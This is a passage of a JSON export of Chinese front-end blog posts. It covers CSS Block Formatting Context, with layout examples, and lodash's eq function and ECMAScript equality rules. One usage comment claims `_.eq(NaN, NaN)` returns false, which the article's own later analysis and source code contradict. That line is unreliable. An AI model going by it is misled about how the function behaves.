},500);\n}\nplay();\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/20/16071630d77c7225?w=255\u0026amp;h=635\u0026amp;f=png\u0026amp;s=5351\"\u003e\u003c/p\u003e\u003ch2\u003e14.小结\u003c/h2\u003e\u003cp\u003e好了，关于我收集到的一些业务需求逻辑，以及实现的方式，就说到这里了！接触到的也无需求逻辑很多，但是值得写的，可以当做练习题的，就记录到这里了。我上面代码实现可能会有点粗糙，大家有更好的实现方案，欢迎建议一下。如果大家有什么可以当做练习题的需求，可以提下。让大家有多些练习题可以尝试下，学习下！\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e","buildTime":"1515067066.1062","__v":0}
{"_id":{"$oid":"5a4e17dee8405d2778beac87"},"id":"5a4dbe026fb9a0452207ebe6","author":{"$oid":"5a4e17dee8405d2778beac7d"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2018/1/4/160bfae6ea247e92?w=304\u0026h=203\u0026f=png\u0026s=189","https://user-gold-cdn.xitu.io/2018/1/4/160bfae6ebe2f403?w=302\u0026h=200\u0026f=png\u0026s=187","https://user-gold-cdn.xitu.io/2018/1/4/160bfae723e59a6f?w=326\u0026h=130\u0026f=png\u0026s=193","https://user-gold-cdn.xitu.io/2018/1/4/160bfae6ea1917ce?w=316\u0026h=124\u0026f=png\u0026s=194","https://user-gold-cdn.xitu.io/2018/1/4/160bfae6e9f5730f?w=209\u0026h=305\u0026f=png\u0026s=1079","https://user-gold-cdn.xitu.io/2018/1/4/160bfae6ebd2b70d?w=205\u0026h=404\u0026f=png\u0026s=1100"],"screenShot":null}],"title":"什么是BFC?","meta":{"likeCount":0},"tag":["前端","CSS"],"comment":[],"shortContent":"对于BFC的概念以及应用场景一直都不是很明白，今天着重去了解了一下，做了以下总结。 在解释 BFC 是什么之前，需要先介绍 Box、Formatting Context的概念。 Box 是 CSS 布局的对象和基本单位， 直观点来说，就是一个页面是由很多个 Box 组成的。元素…","content":"\u003ch3 class=\"heading\"\u003e前言\u003c/h3\u003e\n\u003cp\u003e对于BFC的概念以及应用场景一直都不是很明白，今天着重去了解了一下，做了以下总结。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003eBFC的定义\u003c/h4\u003e\n\u003cp\u003e在解释 BFC 是什么之前，需要先介绍 Box、Formatting Context的概念。\u003c/p\u003e\n\u003ch5 class=\"heading\"\u003eBox: CSS布局的基本单位\u003c/h5\u003e\n\u003cp\u003e  Box 是 CSS 布局的对象和基本单位， 直观点来说，就是一个页面是由很多个 Box 组成的。元素的类型和 display 属性，决定了这个 Box 的类型。 不同类型的 Box， 会参与不同的 Formatting Context（一个决定如何渲染文档的容器），因此Box内的元素会以不同的方式渲染。让我们看看有哪些盒子：\nblock-level box:display 属性为 block, list-item, table 的元素，会生成 block-level box。并且参与 block fomatting context；\ninline-level box:display 属性为 inline, inline-block, inline-table 的元素，会生成 inline-level box。并且参与 inline formatting context；\nrun-in box: css3 中才有， 这儿先不讲了。\u003c/p\u003e\n\u003ch5 class=\"heading\"\u003eFormatting context\u003c/h5\u003e\n\u003cp\u003e  Formatting context 是 W3C CSS2.1 规范中的一个概念。它是页面中的一块渲染区域，并且有一套渲染规则，它决定了其子元素将如何定位，以及和其他元素的关系和相互作用。最常见的 Formatting context 有 Block fomatting context (简称BFC)和 Inline formatting context (简称IFC)。\nCSS2.1 中只有 BFC 和 IFC, CSS3 中还增加了 GFC 和 FFC。\u003c/p\u003e\n\u003ch5 class=\"heading\"\u003eBFC\u003c/h5\u003e\n\u003cp\u003e  BFC（Block Formatting Context）直译为“块级格式化范围”。是 W3C CSS 2.1 规范中的一个概念，它决定了元素如何对其内容进行定位，以及与其他元素的关系和相互作用\n当涉及到可视化布局的时候，Block Formatting Context提供了一个环境，HTML元素在这个环境中按照一定规则进行布局。一个环境中的元素不会影响到其它环境中的布局。比如浮动元素会形成BFC，浮动元素内部子元素的主要受该浮动元素影响，两个浮动元素之间是互不影响的。这里有点类似一个BFC就是一个独立的行政单位的意思。\n也可以说BFC就是一个作用范围。可以把它理解成是一个独立的容器，并且这个容器的里box的布局，与这个容器外的毫不相干\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e怎样才能形成BFC\u003c/h4\u003e\n\u003col\u003e\n\u003cli\u003efloat的值不能为none\u003c/li\u003e\n\u003cli\u003eoverflow的值不能为visible\u003c/li\u003e\n\u003cli\u003edisplay的值为table-cell, table-caption, inline-block中的任何一个\u003c/li\u003e\n\u003cli\u003eposition的值不为relative和static \u003c/li\u003e\n\u003c/ol\u003e\n\u003ch4 class=\"heading\"\u003eBFC的约束规则\u003c/h4\u003e\n\u003col\u003e\n\u003cli\u003e内部的Box会在垂直方向上一个接一个的放置\u003c/li\u003e\n\u003cli\u003e垂直方向的距离有margin决定(属于同一个BFC的两个相邻Box的margin会发生重叠，与方向无关)\u003c/li\u003e\n\u003cli\u003e每个元素的margin box的左边， 与包含块border box的左边相接触(对于从左往右的格式化，否则相反)。即使存在浮动也是如此\u003c/li\u003e\n\u003cli\u003eBFC的区域不会与float的元素区域重叠\u003c/li\u003e\n\u003cli\u003e计算BFC的高度时，浮动子元素也参与计算\u003c/li\u003e\n\u003cli\u003eBFC就是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面元素，反之亦然\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e看到以上的几条约束，让我想起学习css时的几条规则\u003c/p\u003e\n\u003cp\u003eBlock元素会扩展到与父元素同宽，所以block元素会垂直排列\n垂直方向上的两个相邻DIV的margin会重叠，而水平方向不会(此规则并不完全正确)\n浮动元素会尽量接近往左上方（或右上方）\n为父元素设置overflow：hidden或浮动父元素，则会包含浮动元素\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003eBFC的作用\u003c/h4\u003e\n\u003ch5 class=\"heading\"\u003e1. 不和浮动元素重叠\u003c/h5\u003e\n\u003cp\u003e如果一个浮动元素后面跟着一个非浮动的元素，那么就会产生一个覆盖的现象，很多自适应的两栏布局就是这么做的。比如下图的效果，参考例子\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;style\u0026gt;\n    body {\n        width: 300px;\n        position: relative;\n    }\n\n    .aside {\n        width: 100px;\n        height: 150px;\n        \u003cspan class=\"hljs-built_in\"\u003efloat\u003c/span\u003e: left;\n        background: \u003cspan class=\"hljs-comment\"\u003e#f66;\u003c/span\u003e\n    }\n\n    .main {\n        height: 200px;\n        background: \u003cspan class=\"hljs-comment\"\u003e#fcc;\u003c/span\u003e\n    }\n\u0026lt;/style\u0026gt;\n\u0026lt;body\u0026gt;\n    \u0026lt;div class=\u003cspan class=\"hljs-string\"\u003e\"aside\"\u003c/span\u003e\u0026gt;\u0026lt;/div\u0026gt;\n    \u0026lt;div class=\u003cspan class=\"hljs-string\"\u003e\"main\"\u003c/span\u003e\u0026gt;\u0026lt;/div\u0026gt;\n\u0026lt;/body\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfae6ea247e92?w=304\u0026amp;h=203\u0026amp;f=png\u0026amp;s=189\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\n案例分析:\n很明显，.aside和.mian重叠了。试分析一下，由于两个box都处在同一个BFC中，都是以BFC边界为起点，如果两个box本身都具备BFC的话，会按顺序一个一个排列布局，现在.main并不具备BFC，根据BFC布局规则第3条\u003cp\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e每个元素的margin box的左边， 与包含块border box的左边相接触(对于从左往右的格式化，否则相反)。即使存在浮动也是如此。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e虽然存在浮动的元素aslide，但main的左边依然会与包含块的左边相接触\n根据BFC布局规则第四条：\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eBFC的区域不会与float box重叠\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e我们可以通过通过触发main生成BFC， 来实现自适应两栏布局\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e.main {\n    overflow: hidden;\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e当触发main生成BFC后，这个新的BFC不会与浮动的aside重叠。因此会根据包含块的宽度，和aside的宽度，自动变窄。效果如下：\n\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfae6ebe2f403?w=302\u0026amp;h=200\u0026amp;f=png\u0026amp;s=187\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch5 class=\"heading\"\u003e2. 清除元素内部浮动\u003c/h5\u003e\n\u003cp\u003e案例代码:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;style\u0026gt;\n    .par {\n        border: 5px solid \u003cspan class=\"hljs-comment\"\u003e#fcc;\u003c/span\u003e\n        width: 300px;\n    }\n\n    .child {\n        border: 5px solid \u003cspan class=\"hljs-comment\"\u003e#f66;\u003c/span\u003e\n        width:100px;\n        height: 100px;\n        \u003cspan class=\"hljs-built_in\"\u003efloat\u003c/span\u003e: left;\n    }\n\u0026lt;/style\u0026gt;\n\u0026lt;body\u0026gt;\n    \u0026lt;div class=\u003cspan class=\"hljs-string\"\u003e\"par\"\u003c/span\u003e\u0026gt;\n        \u0026lt;div class=\u003cspan class=\"hljs-string\"\u003e\"child\"\u003c/span\u003e\u0026gt;\u0026lt;/div\u0026gt;\n        \u0026lt;div class=\u003cspan class=\"hljs-string\"\u003e\"child\"\u003c/span\u003e\u0026gt;\u0026lt;/div\u0026gt;\n    \u0026lt;/div\u0026gt;\n\u0026lt;/body\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfae723e59a6f?w=326\u0026amp;h=130\u0026amp;f=png\u0026amp;s=193\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\n根据BFC布局规则第六条：\u003cp\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e计算BFC的高度时，浮动元素也参与计算\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e为达到清除内部浮动，我们可以触发par生成BFC，那么par在计算高度时，par内部的浮动元素child也会参与计算。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e.par{\n  overflow:hidden\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e加入上面样式，即可解决问题，效果如下:\n\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfae6ea1917ce?w=316\u0026amp;h=124\u0026amp;f=png\u0026amp;s=194\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch5 class=\"heading\"\u003e3. 防止垂直 margin 重叠\u003c/h5\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;style\u0026gt;\n    p {\n        color: \u003cspan class=\"hljs-comment\"\u003e#f55;\u003c/span\u003e\n        background: \u003cspan class=\"hljs-comment\"\u003e#fcc;\u003c/span\u003e\n        width: 200px;\n        line-height: 100px;\n        text-align:center;\n        margin: 100px;\n    }\n\u0026lt;/style\u0026gt;\n\u0026lt;body\u0026gt;\n    \u0026lt;p\u0026gt;Haha\u0026lt;/p\u0026gt;\n    \u0026lt;p\u0026gt;Hehe\u0026lt;/p\u0026gt;\n\u0026lt;/body\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e页面如下:\n\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfae6e9f5730f?w=209\u0026amp;h=305\u0026amp;f=png\u0026amp;s=1079\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\n两个p之间的距离为100px，发送了margin重叠。根据BFC布局规则第二条：\u003cp\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eBox垂直方向的距离由margin决定。属于同一个BFC的两个相邻Box的margin会发生重叠\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e我们可以在p外面包裹一层容器，并触发该容器生成一个BFC。那么两个P便不属于同一个BFC，就不会发生margin重叠了。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;style\u0026gt;\n    .wrap {\n        overflow: hidden;\n    }\n    p {\n        color: \u003cspan class=\"hljs-comment\"\u003e#f55;\u003c/span\u003e\n        background: \u003cspan class=\"hljs-comment\"\u003e#fcc;\u003c/span\u003e\n        width: 200px;\n        line-height: 100px;\n        text-align:center;\n        margin: 100px;\n    }\n\u0026lt;/style\u0026gt;\n\u0026lt;body\u0026gt;\n    \u0026lt;p\u0026gt;Haha\u0026lt;/p\u0026gt;\n    \u0026lt;div class=\u003cspan class=\"hljs-string\"\u003e\"wrap\"\u003c/span\u003e\u0026gt;\n        \u0026lt;p\u0026gt;Hehe\u0026lt;/p\u0026gt;\n    \u0026lt;/div\u0026gt;\n\u0026lt;/body\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e效果如下:\n\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfae6ebd2b70d?w=205\u0026amp;h=404\u0026amp;f=png\u0026amp;s=1100\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\n按照BFC的定义，只有同属于一个BFC时，两个元素才有可能发生垂直Margin的重叠，这个包括相邻元素，嵌套元素，只要他们之间没有阻挡(例如边框，非空内容，padding等)就会发生margin重叠。\n因此要解决margin重叠问题，只要让它们不在同一个BFC就行了，但是对于两个相邻元素来说，意义不大，没有必要给它们加个外壳，但是对于嵌套元素来说就很有必要了，只要把父元素设为BFC就可以了。这样子元素的margin就不会和父元素的margin发生重叠了。\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e部分内容来自\u003ca target=\"_blank\" href=\"http://blog.melonhuang.gitpress.org/~docs/css/1formattingContext.md\"\u003eBFC背后神奇的原理\u003c/a\u003e\u003c/p\u003e\n","buildTime":"1515067334.4308","__v":0}
{"_id":{"$oid":"5a4e17dee8405d2778beac86"},"id":"5a4d699e518825772a4b637e","author":{"$oid":"5a4b76338b69bb25d83da3d3"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/12/7/1602e879207eb857?w=430\u0026h=430\u0026f=jpeg\u0026s=40267"],"screenShot":null}],"title":"lodash源码分析之NaN不是NaN","meta":{"likeCount":0},"tag":["JavaScript","前端框架","前端","源码","函数式编程"],"comment":[],"shortContent":"本篇分析的是 eq 函数。 eq 函数用来比较两个值是否相等。遵循的是 SameValueZero 规范。 a. 如果 x 为 NaN ，返回 false b. 如果 y 为 NaN ，返回 false c. 如果 x 和 y 的数值一致，返回 true d. 如果 x 为 +…","content":"\u003cblockquote\u003e\n\u003cp\u003e暗恋之纯粹，在于不求结果，完全把自己锁闭在一个单向的关系里面。\u003c/p\u003e\n\u003cp\u003e——梁文道《暗恋到偷窥》\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e本文为读 lodash 源码的第五篇，后续文章会更新到这个仓库中，欢迎 star：\u003ca target=\"_blank\" href=\"https://github.com/yeyuqiudeng/pocket-lodash\"\u003epocket-lodash\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003egitbook也会同步仓库的更新，gitbook地址：\u003ca target=\"_blank\" href=\"https://www.gitbook.com/book/yeyuqiudeng/pocket-lodash/details\"\u003epocket-lodash\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e本篇分析的是 \u003ccode\u003eeq\u003c/code\u003e 函数。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e作用与用法\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003eeq\u003c/code\u003e 函数用来比较两个值是否相等。遵循的是  \u003ca target=\"_blank\" href=\"http://ecma-international.org/ecma-262/6.0/#sec-samevaluezero\"\u003eSameValueZero\u003c/a\u003e 规范。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e obj1 = {\u003cspan class=\"hljs-attr\"\u003etest\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e}\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e obj2 = {\u003cspan class=\"hljs-attr\"\u003etest\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e}\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e obj3 = obj1\n_.eq(\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e) \u003cspan class=\"hljs-comment\"\u003e// true\u003c/span\u003e\n_.eq(+\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e-0\u003c/span\u003e) \u003cspan class=\"hljs-comment\"\u003e// true\u003c/span\u003e\n_.eq(obj1, obj3) \u003cspan class=\"hljs-comment\"\u003e// true\u003c/span\u003e\n_.eq(obj1, obj2) \u003cspan class=\"hljs-comment\"\u003e// false\u003c/span\u003e\n_.eq(\u003cspan class=\"hljs-literal\"\u003eNaN\u003c/span\u003e, \u003cspan class=\"hljs-literal\"\u003eNaN\u003c/span\u003e) \u003cspan class=\"hljs-comment\"\u003e// false\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003e几个比较规范\u003c/h2\u003e\n\u003ch3 class=\"heading\"\u003eSameValueNonNumber\u003c/h3\u003e\n\u003cp\u003e这个规范规定比较的值 \u003ccode\u003ex\u003c/code\u003e 和 \u003ccode\u003ey\u003c/code\u003e 都不为 \u003ccode\u003eNumber\u003c/code\u003e 类型，照抄规范如下：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003ccode\u003ex\u003c/code\u003e 的类型不为 \u003ccode\u003eNumber\u003c/code\u003e 类型\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ey\u003c/code\u003e 的类型与 \u003ccode\u003ex\u003c/code\u003e 的类型一致\u003c/li\u003e\n\u003cli\u003e如果 \u003ccode\u003ex\u003c/code\u003e 的类型为 \u003ccode\u003eUndefined\u003c/code\u003e ，返回 \u003ccode\u003etrue\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e如果 \u003ccode\u003ex\u003c/code\u003e 的类型为 \u003ccode\u003eNull\u003c/code\u003e ，返回 \u003ccode\u003etrue\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e如果 \u003ccode\u003ex\u003c/code\u003e 的类型为 \u003ccode\u003eString\u003c/code\u003e，并且 \u003ccode\u003ex\u003c/code\u003e 和 \u003ccode\u003ey\u003c/code\u003e 的长度及编码相同，返回 \u003ccode\u003etrue\u003c/code\u003e，否则返回 \u003ccode\u003efalse\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e如果 \u003ccode\u003ex\u003c/code\u003e 的类型为 \u003ccode\u003eBoolean\u003c/code\u003e ，并且 \u003ccode\u003ex\u003c/code\u003e 和 \u003ccode\u003ey\u003c/code\u003e 同为 \u003ccode\u003etrue\u003c/code\u003e 或同为\u003ccode\u003efalse\u003c/code\u003e ，返回 \u003ccode\u003etrue\u003c/code\u003e，否则返回 \u003ccode\u003efalse\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e如果 \u003ccode\u003ex\u003c/code\u003e 的类型为 \u003ccode\u003eSymbol\u003c/code\u003e ，并且 \u003ccode\u003ex\u003c/code\u003e 和 \u003ccode\u003ey\u003c/code\u003e 具有相同的 \u003ccode\u003eSymbol\u003c/code\u003e 值，返回 \u003ccode\u003etrue\u003c/code\u003e，否则返回 \u003ccode\u003efalse\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e如果 \u003ccode\u003ex\u003c/code\u003e 和 \u003ccode\u003ey\u003c/code\u003e 指向同一个对象，返回 \u003ccode\u003etrue\u003c/code\u003e， 否则返回 \u003ccode\u003efalse\u003c/code\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 class=\"heading\"\u003eStrict Equality Comparison\u003c/h3\u003e\n\u003cp\u003ejs 中的全等（\u003ccode\u003e===\u003c/code\u003e）便是遵循这个规范，照搬规范如下：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e如果 \u003ccode\u003ex\u003c/code\u003e 和 \u003ccode\u003ey\u003c/code\u003e 的类型不同，返回 \u003ccode\u003efalse\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e如果 \u003ccode\u003ex\u003c/code\u003e 的为 \u003ccode\u003eNumber\u003c/code\u003e 类型：\n\u003cul\u003e\n\u003cli\u003ea. 如果 \u003ccode\u003ex\u003c/code\u003e 为 \u003ccode\u003eNaN\u003c/code\u003e ，返回 \u003ccode\u003efalse\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eb. 如果 \u003ccode\u003ey\u003c/code\u003e 为 \u003ccode\u003eNaN\u003c/code\u003e ，返回 \u003ccode\u003efalse\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003ec. 如果 \u003ccode\u003ex\u003c/code\u003e 和 \u003ccode\u003ey\u003c/code\u003e 的数值一致，返回 \u003ccode\u003etrue\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003ed. 如果 \u003ccode\u003ex\u003c/code\u003e 为 \u003ccode\u003e+0\u003c/code\u003e 并且 \u003ccode\u003ey\u003c/code\u003e 为 \u003ccode\u003e-0\u003c/code\u003e ，返回 \u003ccode\u003etrue\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003ee. 如果 \u003ccode\u003ex\u003c/code\u003e 为 \u003ccode\u003e-0\u003c/code\u003e 并且 \u003ccode\u003ey\u003c/code\u003e 为 \u003ccode\u003e+0\u003c/code\u003e ，返回 \u003ccode\u003etrue\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003ef. 返回 \u003ccode\u003efalse\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e按照 \u003ca target=\"_blank\" href=\"http://ecma-international.org/ecma-262/7.0/#sec-samevaluenonnumber\"\u003eSameValueNonNumber\u003c/a\u003e 的结果返回\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 class=\"heading\"\u003eSameValue\u003c/h3\u003e\n\u003cp\u003e规范如下：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e如果 \u003ccode\u003ex\u003c/code\u003e 和 \u003ccode\u003ey\u003c/code\u003e 的类型不同，返回 \u003ccode\u003efalse\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e如果 \u003ccode\u003ex\u003c/code\u003e 的类型为 \u003ccode\u003eNumber\u003c/code\u003e\n\u003cul\u003e\n\u003cli\u003ea. 如果 \u003ccode\u003ex\u003c/code\u003e  为 \u003ccode\u003eNaN\u003c/code\u003e 并且 \u003ccode\u003ey\u003c/code\u003e 为 \u003ccode\u003eNaN\u003c/code\u003e ，返回 \u003ccode\u003etrue\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eb. 如果 \u003ccode\u003ex\u003c/code\u003e 为 \u003ccode\u003e+0\u003c/code\u003e 并且 \u003ccode\u003ey\u003c/code\u003e 为 \u003ccode\u003e-0\u003c/code\u003e ，返回 \u003ccode\u003efalse\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003ec. 如果 \u003ccode\u003ex\u003c/code\u003e 为 \u003ccode\u003e-0\u003c/code\u003e 并且 \u003ccode\u003ey\u003c/code\u003e 为 \u003ccode\u003e+0\u003c/code\u003e ， 返回 \u003ccode\u003efalse\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003ed. 如果 \u003ccode\u003ex\u003c/code\u003e 和 \u003ccode\u003ey\u003c/code\u003e 的数值一致，返回 \u003ccode\u003etrue\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003ee. 返回 \u003ccode\u003efalse\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e按照 \u003ca target=\"_blank\" href=\"http://ecma-international.org/ecma-262/7.0/#sec-samevaluenonnumber\"\u003eSameValueNonNumber\u003c/a\u003e 的结果返回\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 class=\"heading\"\u003eSameValueZero\u003c/h3\u003e\n\u003cp\u003e这个是 \u003ccode\u003eeq\u003c/code\u003e 遵循的规范，如下：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e如果 \u003ccode\u003ex\u003c/code\u003e 和 \u003ccode\u003ey\u003c/code\u003e 的类型不同，返回 \u003ccode\u003efalse\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e如果 \u003ccode\u003ex\u003c/code\u003e 的类型为 \u003ccode\u003eNumber\u003c/code\u003e\n\u003cul\u003e\n\u003cli\u003ea. 如果 \u003ccode\u003ex\u003c/code\u003e  为 \u003ccode\u003eNaN\u003c/code\u003e 并且 \u003ccode\u003ey\u003c/code\u003e 为 \u003ccode\u003eNaN\u003c/code\u003e ，返回 \u003ccode\u003etrue\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eb. 如果 \u003ccode\u003ex\u003c/code\u003e 为 \u003ccode\u003e+0\u003c/code\u003e 并且 \u003ccode\u003ey\u003c/code\u003e 为 \u003ccode\u003e-0\u003c/code\u003e ，返回 \u003ccode\u003etrue\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003ec. 如果 \u003ccode\u003ex\u003c/code\u003e 为 \u003ccode\u003e-0\u003c/code\u003e 并且 \u003ccode\u003ey\u003c/code\u003e 为 \u003ccode\u003e+0\u003c/code\u003e ， 返回 \u003ccode\u003etrue\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003ed. 如果 \u003ccode\u003ex\u003c/code\u003e 和 \u003ccode\u003ey\u003c/code\u003e 的数值一致，返回 \u003ccode\u003etrue\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003ee. 返回 \u003ccode\u003efalse\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e按照 \u003ca target=\"_blank\" href=\"http://ecma-international.org/ecma-262/7.0/#sec-samevaluenonnumber\"\u003eSameValueNonNumber\u003c/a\u003e 的结果返回\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e小结：\u003ccode\u003eSameValueNonNumber\u003c/code\u003e 是基本，\u003ccode\u003eStrict Equality Comparison\u003c/code\u003e 、\u003ccode\u003eSameValue\u003c/code\u003e 和 \u003ccode\u003eSameValueZero\u003c/code\u003e 只是在对待 \u003ccode\u003e+0\u003c/code\u003e、\u003ccode\u003e-0\u003c/code\u003e 和 \u003ccode\u003eNaN\u003c/code\u003e 上有区别。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e源码分析\u003c/h2\u003e\n\u003cp\u003e来看下 \u003ccode\u003eeq\u003c/code\u003e 的源码：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eeq\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003evalue, other\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e value === other || (value !== value \u0026amp;\u0026amp; other !== other)\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e其实\u003ccode\u003eeq\u003c/code\u003e 的源码其实就只有这么一句。\u003c/p\u003e\n\u003cp\u003e既然 \u003ccode\u003eeq\u003c/code\u003e 遵循的是 \u003ccode\u003eSameValueZero\u003c/code\u003e 规范，那就将源码来拆解一下，看它是怎样符合规范的。\u003c/p\u003e\n\u003cp\u003e首先，看第一部分：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003evalue === other\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e就是这么一段，符合的是 \u003ccode\u003eStrict Equality Comparison\u003c/code\u003e 规范，通过对比可以发现， \u003ccode\u003eStrict Equality Comparison\u003c/code\u003e 和 \u003ccode\u003eSameValueZero\u003c/code\u003e 只在对待 \u003ccode\u003eNaN\u003c/code\u003e 上有区别。\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eStrict Equality Comparison\u003c/code\u003e 规定就算 \u003ccode\u003ex\u003c/code\u003e 和 \u003ccode\u003ey\u003c/code\u003e 都为 \u003ccode\u003eNaN\u003c/code\u003e 时，返回的是 \u003ccode\u003efalse\u003c/code\u003e， \u003ccode\u003eNaN === NaN\u003c/code\u003e 返回的就是 \u003ccode\u003efalse\u003c/code\u003e。但是 \u003ccode\u003eSameValueZero\u003c/code\u003e 返回的是规定 \u003ccode\u003ex\u003c/code\u003e 和 \u003ccode\u003ey\u003c/code\u003e 都为 \u003ccode\u003eNaN\u003c/code\u003e 时返回的是 \u003ccode\u003etrue\u003c/code\u003e。因此只需要在 \u003ccode\u003eStrict Equality Comparison\u003c/code\u003e 的基础上处理 